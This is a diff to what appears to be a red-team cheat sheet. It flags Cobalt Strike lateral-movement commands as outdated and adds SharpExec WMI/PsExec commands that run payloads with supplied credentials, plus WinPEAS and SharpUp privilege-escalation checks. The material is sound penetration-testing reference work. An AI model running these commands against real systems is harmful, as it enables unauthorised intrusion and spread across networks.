@@ -127,7 +127,7 @@ execute-assembly C:\CVE-2021-36934.exe
 
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
-Cobalt Strike jumping
+Cobalt Strike jumping (OUTDATED)
 ```
 # Jump using WinRM if it's enabled for the current user on the target system
 jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER
@@ -136,7 +136,7 @@ jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER
 jump psexec64 ops-jumpbox.lab.com HTTPSLISTENER
 ```
 
-Cobalt Strike remote-exec - Executes commands on a target system using psexec, winrm or wmi
+Cobalt Strike remote-exec - Executes commands on a target system using psexec, winrm or wmi (OUTDATED)
 ```
 # remote-exec using WMI
 remote-exec wmi ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"
@@ -192,6 +192,28 @@ jump winrm64 jumpbox.lab.com
 
 [Move Kit](https://github.com/0xthirteen/MoveKit)
 Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for doing lateral movement with various techniques
+
+[SharpExec](https://github.com/anthemtotheego/SharpExec) - CSharp tooling lateral movement
+```
+# WMI lateral movement
+execute-assembly SharpExec.exe -m=wmi -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c="/c C:\path\to\payload"
+
+# PSExec lateral movement
+execute-assembly SharpExec.exe -m=psexec -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c="/c C:\path\to\payload"
+```
+
+------------------------------------------------------------------------------------------
+## Local Privilege Escalation
+
+[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) - Windows Privilege Escalation Awesome Script<br>
+```execute-assembly winpeas.exe #run all checks```<br>
+
+[SharpUp](https://github.com/GhostPack/SharpUp) - SharpUp - GhostPack CSharp tool<br>
+```
+execute-assembly SharpUp.exe audit # run all checks
+execute-assembly SharpUp.exe HijackablePaths # run individual check
+```
+
 
 ------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
